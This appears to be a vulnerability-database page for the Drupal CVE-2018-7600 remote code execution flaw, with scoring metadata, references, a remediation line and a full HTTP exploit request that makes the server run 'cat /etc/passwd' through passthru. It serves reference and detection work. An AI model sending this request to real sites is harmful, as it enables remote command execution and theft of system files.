---
layout: post
cve_id: CVE-2018-7600
title: Drupal - Remote Code Execution
pcap: true
pcap_path: /pcaps/2018/CVE-2018-7600.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-7600.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: critical
impact: 'Critical

  '
remediation: 'Upgrade to the latest version of Drupal or apply the official patch
  provided by Drupal security team.

  '
reference:
- https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
- https://nvd.nist.gov/vuln/detail/CVE-2018-7600
- https://www.drupal.org/sa-core-2018-002
- https://groups.drupal.org/security/faq-2018-002
- http://www.securitytracker.com/id/1040598
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-7600
  cwe-id: CWE-20
  epss-score: 0.94489
  epss-percentile: 0.99999
  cpe: cpe:2.3:a:drupal:drupal:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: drupal
  product: drupal
  shodan-query:
  - http.component:"drupal"
  - cpe:"cpe:2.3:a:drupal:drupal"
tags:
- cve
- cve2018
- drupal
- rce
- kev
- vulhub
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.

## üåê HTTP Request
```nohighlight
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Content-Length: 631
Accept: application/json
Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663
Referer: www.victim.com/user/register
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#post_render][]"

passthru
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#type]"

markup
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#markup]"

cat /etc/passwd
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="form_id"

user_register_form
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="_drupal_ajax"
```

